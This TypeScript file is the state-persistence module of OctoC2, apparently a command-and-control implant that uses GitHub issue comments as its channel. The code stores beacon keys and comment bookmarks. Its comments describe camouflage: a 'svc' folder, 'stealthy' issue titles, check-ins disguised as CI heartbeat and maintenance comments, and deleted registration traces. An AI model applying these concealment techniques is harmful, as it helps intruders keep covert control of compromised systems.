/**
 * OctoC2 — BeaconState
 *
 * Persistent state for a beacon instance. Survives process restarts.
 * Stores the stable beacon identity, key pair, and per-tentacle bookmarks.
 *
 * Location resolution order:
 *   Linux/macOS : $XDG_CONFIG_HOME/svc/{beaconId}.json
 *                 (falls back to ~/.config/svc/{beaconId}.json)
 *   Windows     : %APPDATA%\svc\{beaconId}.json
 *   Fallback    : ./svc-state.json  (containers, restricted envs)
 *
 * Writes are atomic: write to {path}.tmp then rename, preventing
 * corruption on crash or power loss.
 *
 * Phase 2: plaintext JSON, chmod 0600.
 * Phase 5: AES-256-GCM with machine-derived key (HKDF from machineId).
 */

import { join } from "node:path";
import { homedir } from "node:os";
import { mkdir, readFile, writeFile, rename, chmod } from "node:fs/promises";
import { existsSync } from "node:fs";

export interface BeaconStateData {
  version: 1;
  beaconId: string;
  /** Issues tentacle: persistent issue number (null until discovered/created) */
  issueNumber: number | null;
  /** Issues tentacle: monotonic sequence counter for replay protection */
  seq: number;
  /**
   * Issues tentacle: highest task comment ID processed.
   * Used as lower bound for next poll to avoid re-processing old comments.
   */
  lastTaskCommentId: number | null;
  /** Issues tentacle: whether the server has ACKed the registration comment */
  registrationStatus: "pending" | "registered";
  /**
   * Issues tentacle: GitHub comment ID of the persistent CI heartbeat comment.
   * Subsequent checkins PATCH this comment in-place to avoid issue spam.
   * Null until the first post-registration checkin.
   */
  ciCommentId: number | null;
  /**
   * Issues tentacle: GitHub comment ID of the persistent maintenance session block.
   * Null until first upsertMaintenanceComment() call.
   */
  maintenanceCommentId: number | null;
  /**
   * Issues tentacle: UUID used as the hidden HTML marker for the maintenance comment.
   * Stays stable across updates so the comment can be found/updated by ID.
   * Null until first upsertMaintenanceComment() call.
   */
  maintenanceSessionId: string | null;
  /**
   * Issues tentacle: ISO-8601 timestamp when the maintenance session was opened.
   * Set once when maintenanceSessionId is first generated.
   */
  maintenanceSessionOpenedAt: string | null;
  /**
   * Issues tentacle: epoch-ms when the maintenance comment was last updated.
   * Used for rate-limiting (max once per 30–60 s). Defaults to 0.
   */
  lastMaintenanceUpdateMs: number;
  /**
   * Issues tentacle: true after the first maintenance comment is successfully
   * created. Persists across restarts so checkin() skips the CI heartbeat
   * even on the very first checkin after a restart.
   */
  initialMaintenancePosted: boolean;
  /**
   * Issues tentacle: GitHub comment ID of the one-time registration comment.
   * Saved so the comment can be deleted after the server ACK is processed.
   * Null once the comment has been deleted (or if it was never posted).
   */
  regCommentId: number | null;
  /**
   * Issues tentacle: the title used when creating this beacon's GitHub issue.
   * Set once in discoverOrCreateIssue() (either from OCTOC2_ISSUE_TITLE env var
   * or generated from the stealthy default format).
   * Null until the issue has been discovered or created.
   */
  issueTitle: string | null;
  /** Beacon X25519 key pair — stable across restarts, registered with server */
  keyPair: {
    publicKey: string; // base64url
    secretKey: string; // base64url — sensitive, see Phase 5 note above
  };
}

export class BeaconState {
  private data: BeaconStateData;
  readonly filePath: string;

  constructor(data: BeaconStateData, filePath: string) {
    this.data = { ...data };
    this.filePath = filePath;
  }

  get beaconId():           string                    { return this.data.beaconId; }
  get issueNumber():        number | null              { return this.data.issueNumber; }
  get seq():                number                    { return this.data.seq; }
  get lastTaskCommentId():  number | null              { return this.data.lastTaskCommentId; }
  get registrationStatus(): "pending" | "registered"  { return this.data.registrationStatus; }
  get ciCommentId():        number | null              { return this.data.ciCommentId ?? null; }
  get keyPair():            BeaconStateData["keyPair"] { return this.data.keyPair; }

  set issueNumber(v: number | null)                  { this.data.issueNumber = v; }
  set lastTaskCommentId(v: number | null)            { this.data.lastTaskCommentId = v; }
  set registrationStatus(v: "pending" | "registered") { this.data.registrationStatus = v; }
  set ciCommentId(v: number | null)                  { this.data.ciCommentId = v; }

  get maintenanceCommentId():       number | null { return this.data.maintenanceCommentId    ?? null; }
  get maintenanceSessionId():       string | null { return this.data.maintenanceSessionId    ?? null; }
  get maintenanceSessionOpenedAt(): string | null { return this.data.maintenanceSessionOpenedAt ?? null; }
  get lastMaintenanceUpdateMs():    number        { return this.data.lastMaintenanceUpdateMs  ?? 0; }

  set maintenanceCommentId(v: number | null)       { this.data.maintenanceCommentId    = v; }
  set maintenanceSessionId(v: string | null)       { this.data.maintenanceSessionId    = v; }
  set maintenanceSessionOpenedAt(v: string | null) { this.data.maintenanceSessionOpenedAt = v; }
  set lastMaintenanceUpdateMs(v: number)           { this.data.lastMaintenanceUpdateMs  = v; }

  get initialMaintenancePosted(): boolean      { return this.data.initialMaintenancePosted ?? false; }
  get regCommentId():             number | null { return this.data.regCommentId ?? null; }

  set initialMaintenancePosted(v: boolean)      { this.data.initialMaintenancePosted = v; }
  set regCommentId(v: number | null)            { this.data.regCommentId = v; }

  get issueTitle(): string | null { return this.data.issueTitle ?? null; }
  set issueTitle(v: string | null) { this.data.issueTitle = v; }

  /** Increment and return the next sequence number. Call before every comment post. */
  nextSeq(): number {
    this.data.seq += 1;
    return this.data.seq;
  }

  /**
   * Atomically write the current state to disk.
   * Writes to a .tmp file first, then renames — safe on crash.
   */
  async persist(): Promise<void> {
    const tmp = `${this.filePath}.tmp`;
    const json = JSON.stringify(this.data, null, 2);
    await writeFile(tmp, json, "utf8");
    await rename(tmp, this.filePath);
    // Best-effort: restrict file permissions. Silently ignored on Windows.
    await chmod(this.filePath, 0o600).catch(() => {});
  }

  toJSON(): BeaconStateData {
    return { ...this.data };
  }
}

function resolveStatePath(beaconId: string): string {
  const home = homedir();

  if (process.platform === "win32") {
    const appData = process.env["APPDATA"] ?? join(home, "AppData", "Roaming");
    return join(appData, "svc", `${beaconId}.json`);
  }

  const xdgConfig = process.env["XDG_CONFIG_HOME"] ?? join(home, ".config");
  return join(xdgConfig, "svc", `${beaconId}.json`);
}

const FALLBACK_PATH = "./svc-state.json";

/**
 * Load existing state for the given beacon ID.
 * Returns null if no state file exists (first run).
 * Tries the platform-standard path, then the fallback path.
 */
export async function loadState(beaconId: string): Promise<BeaconState | null> {
  const candidates = [resolveStatePath(beaconId), FALLBACK_PATH];

  for (const path of candidates) {
    if (!existsSync(path)) continue;
    try {
      const raw = await readFile(path, "utf8");
      const data = JSON.parse(raw) as BeaconStateData;

      if (data.version !== 1) {
        console.warn(`[NodeState] Unknown state version ${data.version} at ${path}, skipping.`);
        continue;
      }
      if (data.beaconId !== beaconId) {
        console.warn(`[NodeState] State file at ${path} belongs to node ${data.beaconId}, not ${beaconId}, skipping.`);
        continue;
      }

      // Back-fill fields added in later schema revisions so old state files
      // load cleanly without a migration step.
      data.maintenanceCommentId       = data.maintenanceCommentId       ?? null;
      data.maintenanceSessionId       = data.maintenanceSessionId       ?? null;
      data.maintenanceSessionOpenedAt = data.maintenanceSessionOpenedAt ?? null;
      data.lastMaintenanceUpdateMs    = data.lastMaintenanceUpdateMs    ?? 0;
      data.initialMaintenancePosted = data.initialMaintenancePosted ?? false;
      data.regCommentId             = data.regCommentId             ?? null;
      data.issueTitle               = data.issueTitle               ?? null;

      return new BeaconState(data, path);
    } catch (err) {
      console.warn(`[NodeState] Failed to parse state from ${path}:`, (err as Error).message);
    }
  }

  return null;
}

/**
 * Create a fresh state file for a new beacon.
 * Tries the platform-standard directory first; falls back to current dir.
 *
 * @param beaconId  - stable UUID for this beacon (generated in index.ts on first run)
 * @param keyPair   - base64url-encoded X25519 public + secret key
 */
export async function createState(
  beaconId: string,
  keyPair: { publicKey: string; secretKey: string }
): Promise<BeaconState> {
  const primaryPath = resolveStatePath(beaconId);
  let filePath = primaryPath;

  // Ensure the parent directory exists; fall back to current dir on permission error
  try {
    await mkdir(join(primaryPath, ".."), { recursive: true });
  } catch {
    filePath = FALLBACK_PATH;
  }

  const data: BeaconStateData = {
    version: 1,
    beaconId,
    issueNumber: null,
    seq: 0,
    lastTaskCommentId: null,
    registrationStatus: "pending",
    ciCommentId: null,
    maintenanceCommentId:       null,
    maintenanceSessionId:       null,
    maintenanceSessionOpenedAt: null,
    lastMaintenanceUpdateMs:    0,
    initialMaintenancePosted: false,
    regCommentId:             null,
    issueTitle:               null,
    keyPair,
  };

  const state = new BeaconState(data, filePath);
  await state.persist();
  return state;
}
